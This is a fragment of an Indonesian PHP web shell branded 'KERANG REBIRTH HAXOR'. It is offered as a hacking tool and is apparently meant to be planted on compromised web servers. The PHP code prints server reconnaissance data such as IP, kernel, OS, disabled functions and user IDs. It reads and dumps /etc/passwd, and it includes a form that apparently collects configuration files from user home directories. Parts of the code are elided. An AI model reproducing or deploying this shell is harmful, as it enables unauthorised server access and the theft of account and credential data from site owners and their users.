...
<center>
<hr>
 <font color=red><b><h1>dihanha<font color=white>xor1337</h1>
<p>
...
<b> <font color=yellow>KERANG <font color=aquamarine> REBIRTH HAXOR <font color=yellow> EDISI PERTAMA 2020 <font color=aqua>[ <font color=white>BUATAN OMEST <font color=aqua>]</b>
<br><br>
	<font color=lime>
<?php
...
echo "SERVER IP > <font color=#E52323>".gethostbyname($_SERVER['HTTP_HOST'])."<br></font>";
echo "KERNEL > <font color=#E52323>".php_uname()."<br></font>";
echo "PERANGKAT LUNAK > <font color=#E52323>".$soft."<br></font>";
echo "SISTEM OPERASI > <font color=#E52323>".$os."<br></font>";
echo "MODE AMAN > <font color=#E52323>".$sm."<br></font>";
echo "FUNGSI MATI > <font color=#E52323>".$show_ds."<br></font>";
echo "PENGGUNA > <font color=aqua>".$user."</font><font color=#E52323> (".$uid.") </font> KELOMPOK > <font color=aqua>".$group."</font><font color=#E52323> (".$gid.") </font>
<br>";
?>
<hr>
<?php
...
elseif($_GET["jump"] == "true"){
   $i = 0;
	...
	if(preg_match("/hsphere/", $dir)) {
		...
		echo "<pre>";
		$etc = fopen("/etc/passwd", "r") or die("<font color=red>tidak bisa membaca /etc/passwd</font>");
...
<input style="color:red;background-color:#FFFF" name="conf" type="submit" size="10" value="&#9829;">
<br/><br/></form>';
if ($_POST['conf']) {
$home = $_POST['home'];
$folfig = $home;
...
?>
<hr><font color=red>D<font color=white>I<font color=red>A<font color=white>N <font color=lime> &#9829; <font color=red>H<font color=white>A<font color=red>N<font color=white>N<font color=red>A
